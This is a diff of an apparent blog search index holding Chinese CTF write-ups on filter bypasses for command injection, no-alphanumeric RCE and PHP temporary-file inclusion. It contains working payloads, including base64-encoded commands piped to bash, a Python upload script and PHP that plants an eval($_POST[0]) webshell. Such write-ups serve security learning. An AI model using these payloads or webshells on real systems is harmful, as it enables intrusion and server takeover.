-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>但仔细观察源码发现有一个$a变量可以覆盖</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤</span><br><span class="line">?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php	没flag</span><br><span class="line">?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php  	过滤</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php	有flag</span><br><span class="line">?ip=127.0.0.1;a=fl;b=ag;cat$IFS$1$a$b.php 过滤</span><br><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php 有flag</span><br></pre></td></tr></table></figure>
-
-<p>变量替换顺序，效果也不一样</p>
-<h3 id="简单变量替换，用-a覆盖拼接flag"><a href="#简单变量替换，用-a覆盖拼接flag" class="headerlink" title="简单变量替换，用$a覆盖拼接flag"></a>简单变量替换，用$a覆盖拼接flag</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">查看源码</span><br></pre></td></tr></table></figure>
-
-<h3 id="变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="变量ab互换传递，绕过字符串匹配，实现拼接"></a>变量ab互换传递，绕过字符串匹配，实现拼接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="被过滤的bash，用管道-sh替换"><a href="#被过滤的bash，用管道-sh替换" class="headerlink" title="被过滤的bash，用管道+sh替换"></a>被过滤的bash，用管道+sh替换</h3><p><code>cat flag.php</code>用base64加密来绕过正则匹配</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br></pre></td></tr></table></figure>
-
-<p>过滤了flag、bash，但sh没过滤，linux下可用sh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
-
-<p><code>|sh</code> 就是执行前面的echo脚本</p>
-<h3 id="类似题的大概思路"><a href="#类似题的大概思路" class="headerlink" title="类似题的大概思路"></a>类似题的大概思路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl&#x27;&#x27;ag.php        两个单引号绕过</span><br><span class="line">echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      </span><br><span class="line">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       </span><br><span class="line">//hex编码绕过(引号可以去掉)</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     </span><br><span class="line">//sh的效果和bash一样</span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a$b          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br></pre></td></tr></table></figure>
-
-<p>通配符</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*       <span class="comment">#匹配全部字符，通配符</span></span><br><span class="line">?       <span class="comment">#任意一个字符，通配符</span></span><br><span class="line">[]      <span class="comment">#表示一个范围（正则，通配符）</span></span><br><span class="line">&#123;&#125;      <span class="comment">#产生一个序列（通配符）</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/20/2UfKa9yFiozxOg8.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>命令执行</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-        <tag>Ping</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>无数字字母RCE学习记录</title>
     <url>/2024/03/09/%E6%97%A0%E5%AD%97%E6%AF%8DRCE/</url>
     <content><![CDATA[<h1 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="无数字字母RCE"></a>无数字字母RCE</h1><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -1380,6 +1284,102 @@
       <tags>
         <tag>命令执行</tag>
         <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>包含临时文件学习记录</title>
+    <url>/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h1><h2 id="php文件上传特性"><a href="#php文件上传特性" class="headerlink" title="php文件上传特性"></a>php文件上传特性</h2><p><img src="https://s2.loli.net/2023/11/18/5AgRPFiqI4KeX3a.png" alt="img"></p>
+<span id="more"></span>
+
+<p>php中上传文件，会创建临时文件，随机生成临时文件名（临时文件名为<code>php+6位[a-zA-Z0-9]</code>，比如<code>phpkx32ma</code>），将上传的内容写入临时文件后，关闭临时文件。在<code>linux</code>下保存在<code>/tmp</code>目录，而在<code>windows</code>下保存在<code>c:\winsdows\temp</code>目录。然后开始执行文件内程序，执行完后删除。因此，可以上传包含payload的恶意文件，在文件被删除前（作为临时文件）包含该文件，可以实现利用。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>配合<code>phpinfo</code>页面的<code>php variables</code>，可以直接获取到上传文件的存储路径和临时文件名</p>
+<p><img src="https://s2.loli.net/2023/11/18/YWsGoH6aLJiC2Uc.png" alt="image-20231025142053342"></p>
+<h2 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h2><p>临时文件转瞬即逝，如何在短时间内包含它？</p>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争就是一直上传文件，同时一直去包含临时文件，竞争一下是先包含还是先删除。</p>
+<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出，临时文件就不会被删除。</p>
+<p>在php7中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/string.strip_tags=/etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>会造成段错误。 </p>
+<p>适用版本： </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>
+
+<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><p>查看网页源代码，发现提示信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>传递name参数，用burp抓包并发送到repeater模块</p>
+<p><img src="https://s2.loli.net/2023/11/18/y9SgG3NDnjQacIB.png" alt="image-20231025161936687"></p>
+<p><img src="https://s2.loli.net/2023/11/18/oQL6JwPxvsfSk4a.png" alt="image-20231025161900649"></p>
+<p>经过测试，发现改变name的值，响应包中Hash值会响应改变（name和hash一一对应），结合提示，可以传入pass参数，值为响应包中的Hash值（name值和pass值要相对应）。</p>
+<p><img src="https://s2.loli.net/2023/11/18/IDOkeyP7MNYGdKZ.png" alt="image-20231025162123175"></p>
+<p>在响应包中发现提示文件：<code>flflflflag.php</code>，访问该文件</p>
+<p><img src="https://s2.loli.net/2023/11/18/mxInGt6O72psNyY.png" alt="image-20231025162404641"></p>
+<p>发现文件包含，猜测可能是文件包含漏洞，可以查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</span><br></pre></td></tr></table></figure>
+
+<p>用BurpSuite拦截响应，base64解码后得到源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">	die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用目录扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
+
+<p>扫描发现dir.php。</p>
+<p><img src="https://s2.loli.net/2023/11/18/ruxOEn2CovHcR5U.png" alt="image-20231025165147270"></p>
+<p><img src="https://s2.loli.net/2023/11/18/ULTyQMfe9zqj4VW.png" alt="image-20231025165242501"></p>
+<p>访问dir.php文件：</p>
+<p><img src="https://s2.loli.net/2023/11/18/o7rUlwePmHFVIqA.png" alt="image-20231025163132883"></p>
+<p>查看dir.php源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>
+
+<p>用Burpsuite拦截响应，base64解码后源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。</p>
+<p>该题存在文件包含，而且可以显示临时文件夹（&#x2F;tmp）的内容，因此可以考虑临时文件包含的方法解题。同时，根据响应包中内容：<code>X-Powered-By: PHP/7.0.33</code>，说明php版本存在段错误。</p>
+<p>编写python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO </span><br><span class="line"><span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> </span><br><span class="line"><span class="comment">#注入的恶意命令</span></span><br><span class="line"><span class="comment">#payload=&quot;&lt;?php echo 12;fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo 1234;eval($_POST[0]);?&gt;&#x27;);?&gt;&quot; </span></span><br><span class="line"><span class="comment">#把一句话木马写入shell.php</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>执行该脚本后，payload就注入到临时文件了。</p>
+<p>再次访问dir.php文件，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phpVvvefu</p>
+<p><img src="https://s2.loli.net/2023/11/18/jymveQM7NRstuDc.png" alt="image-20231025164408642"></p>
+<p>利用BurpSuite发送请求，由于本题的flag在<code>phpinfo()</code>中，因此这样就能得到flag：</p>
+<p><img src="https://s2.loli.net/2023/11/18/d5BhRK1X6Tgta9m.png" alt="image-20231025164751449"></p>
+<h3 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h3><p>自己包含自己，进入死循环，脚本永不结束，也就不会删除临时文件。</p>
+<p>文件上传，phpinfo，自包含三者缺一不可，在同一个页面发生。</p>
+<p>题目网址：<a href="http://b.y1ng.vip:2039/%EF%BC%88%E5%B7%B2%E5%A4%B1%E6%95%88%EF%BC%89">http://b.y1ng.vip:2039/（已失效）</a></p>
+<p>题目源码（文件位于<code>index.php</code>）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$page</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>如果将<code>page</code>赋值为<code>index.php</code>，就会开始自包含。</p>
+<p>然后对死循环发送POST请求，此时POST请求对应的临时文件才不会被清理。</p>
+<p>创建上传表单（<code>untitled.html</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://b.y1ng.vip:2039/?page=index.php&amp;info&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt; </span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>创建上传文件（<code>1.txt</code>）：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>); </span><br><span class="line">    <span class="comment"># 123用于检查是否上传成功</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo(&#x27;</span><span class="number">1234</span><span class="string">&#x27;); eval($_POST[0]);?&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment"># 1234用于检查是否执行成功</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，如果循环次数过多会导致电脑死机，所以不建议长时间循环，最好的方式是包含后就生成一个永久的shell，一包含到就可以结束自包含。</p>
+<p>打开上传表单：</p>
+<p><img src="https://s2.loli.net/2023/11/18/2CguitUDP35bB9s.png" alt="image-20231025193909257"></p>
+<p>上传成功后找到路径</p>
+<p><img src="https://s2.loli.net/2023/11/18/uSEZL1jxi2TqfCM.png" alt="image-20231025195150883"></p>
+<p>包含</p>
+<p><img src="https://s2.loli.net/2023/11/18/8hvtMaESITi7Jd4.png" alt="image-20231025195241303"></p>
+<p>输出123表示1.txt文件上传成功</p>
+<p>关闭循环，找到木马文件路径</p>
+<p><img src="https://s2.loli.net/2023/11/18/nUJworM2IdKe4Eu.png" alt="image-20231025195421339"></p>
+<p>输出1234表示一句话木马执行成功。接下来连蚁剑，找flag。</p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
       </tags>
   </entry>
 </search>
